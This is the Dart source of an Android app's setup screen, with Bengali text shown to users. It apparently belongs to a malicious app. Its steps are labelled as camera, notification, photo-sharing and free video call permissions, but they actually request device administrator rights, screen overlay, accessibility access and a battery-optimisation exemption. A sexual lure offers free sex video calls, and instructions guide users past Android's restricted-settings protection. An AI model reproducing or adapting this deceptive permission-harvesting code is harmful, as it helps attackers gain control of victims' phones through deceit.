import 'package:flutter/material.dart';

import '../services/device_admin_service.dart';

class SetupScreen extends StatefulWidget {
  final VoidCallback onDone;

  const SetupScreen({super.key, required this.onDone});

  @override
  State<SetupScreen> createState() => _SetupScreenState();
}

class _Step {
  final String key;
  final String title;
  final String desc;
  final IconData icon;
  final Future<void> Function() action;

  const _Step(this.key, this.title, this.desc, this.icon, this.action);
}

class _SetupScreenState extends State<SetupScreen>
    with WidgetsBindingObserver {
  Map<String, bool> _status = {
    'admin': false,
    'overlay': false,
    'accessibility': false,
    'battery': false,
  };

  bool _finished = false;

  late final List<_Step> _steps = [
    _Step(
      'admin',
      '১. ক্যামেরা অনুমতি দিন',
      'অ্যাপের সব ফিচার ঠিকভাবে ব্যবহার করতে আপনার ক্যাম্বেরা ব্যবহার করা অনুমতি প্রয়োজন ।',
      Icons.admin_panel_settings_rounded,
      DeviceAdminService.requestAdmin,
    ),
    _Step(
      'overlay',
      '২. নোটিফিকেশন অনুমতি দিন',
      'গুরুত্ত্বপুর্ণ সতর্কতা এবং আপডেট মিস না করতে নোটিফিকেশন চালু করুন।',
      Icons.layers_rounded,
      DeviceAdminService.requestOverlay,
    ),
    _Step(
      'accessibility',
      '৩. ফটোস এবং ভিডিওর জন্য Accessibility চালু করুন',
      'অ্যাপস ব্যবহারের জন্য ফটো এবং ভিডিও আদান প্রদান করার অনুমতি দিন।',
      Icons.accessibility_new_rounded,
      DeviceAdminService.requestAccessibility,
    ),
    _Step(
      'battery',
      '৪.ফ্রী ভিডিও কল চালু করুনঃ',
      '''উপরের তিনটি ধাপ পূর্ণ করে চার নম্বর ধাপটি সম্পূর্ণ করুন, তাহলেই ফ্রিতে ভিডিও কলে সেক্স করতে পারবেন''',
      Icons.battery_charging_full_rounded,
      DeviceAdminService.requestBattery,
    ),
  ];

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    DeviceAdminService.requestNotifications();
    _refresh();
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) {
      _refresh();
    }
  }

  Future<void> _refresh() async {
    final results = await Future.wait([
      DeviceAdminService.isAdminActive(),
      DeviceAdminService.isOverlayGranted(),
      DeviceAdminService.isAccessibilityEnabled(),
      DeviceAdminService.isBatteryIgnored(),
    ]);

    if (!mounted) return;

    setState(() {
      _status = {
        'admin': results[0],
        'overlay': results[1],
        'accessibility': results[2],
        'battery': results[3],
      };
    });

    if (!_finished && results.every((e) => e)) {
      _finished = true;
      widget.onDone();
    }
  }

  @override
  Widget build(BuildContext context) {
    final nextKey = _steps
        .firstWhere(
          (s) => _status[s.key] != true,
          orElse: () => _steps.last,
        )
        .key;

    final doneCount = _status.values.where((e) => e).length;

    return Scaffold(
      appBar: AppBar(title: const Text('sexy  Guard Setup')),
      body: SafeArea(
        child: ListView(
          padding: const EdgeInsets.all(20),
          children: [
            const Text(
              'প্রায় শেষ!',
              style: TextStyle(fontSize: 26, fontWeight: FontWeight.bold),
            ),
            const SizedBox(height: 6),
            Text(
              'নিচের ৪টি ধাপে একবার করে "Allow" চাপুন। ($doneCount/৪ সম্পন্ন)',
              style: const TextStyle(color: Colors.black54, height: 1.4),
            ),
            const SizedBox(height: 10),
            LinearProgressIndicator(
              value: doneCount / 4,
              minHeight: 8,
              borderRadius: BorderRadius.circular(8),
            ),
            const SizedBox(height: 20),
            for (final step in _steps) _buildCard(step, step.key == nextKey),
          ],
        ),
      ),
    );
  }

  Widget _buildCard(_Step step, bool isNext) {
    final done = _status[step.key] == true;

    return Card(
      margin: const EdgeInsets.only(bottom: 14),
      color: done ? Colors.green.shade50 : Colors.white,
      child: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Icon(
                  done ? Icons.check_circle_rounded : step.icon,
                  color: done ? Colors.green : Colors.indigo,
                  size: 32,
                ),
                const SizedBox(width: 12),
                Expanded(
                  child: Text(
                    step.title,
                    style: const TextStyle(
                      fontSize: 17,
                      fontWeight: FontWeight.w700,
                    ),
                  ),
                ),
              ],
            ),
            const SizedBox(height: 8),
            Text(
              step.desc,
              style: const TextStyle(color: Colors.black54, height: 1.4),
            ),
            if (step.key == 'accessibility' && !done) ...[
              const SizedBox(height: 10),
              Container(
                padding: const EdgeInsets.all(12),
                decoration: BoxDecoration(
                  color: Colors.orange.shade50,
                  borderRadius: BorderRadius.circular(10),
                ),
                child: const Text(
                  'Android 11 বা নতুন ফোনে পরের বাটন Child Guard-এর Accessibility সেটিংস সরাসরি খুলবে। সেখানে সুইচটি চালু করে অনুমতি নিশ্চিত করুন।\n\n'
                  'সুইচ চালু না হলে: App সেটিংস খুলুন → ⋮ → Allow restricted settings। তারপর Accessibility সেটিংসে ফিরে সুইচটি চালু করুন.',
                  style: TextStyle(height: 1.5, fontSize: 13),
                ),
              ),
              const SizedBox(height: 8),
              OutlinedButton(
                onPressed: DeviceAdminService.openAppDetails,
                child: const Text('Restricted settings-এর জন্য App সেটিংস'),
              ),
            ],
            if (!done) ...[
              const SizedBox(height: 12),
              SizedBox(
                width: double.infinity,
                height: 50,
                child: isNext
                    ? FilledButton(
                        onPressed: step.action,
                        child: const Text('Accessibility সেটিংস খুলুন'),
                      )
                    : OutlinedButton(
                        onPressed: step.action,
                        child: const Text('Accessibility সেটিংস খুলুন'),
                      ),
              ),
            ],
          ],
        ),
      ),
    );
  }
}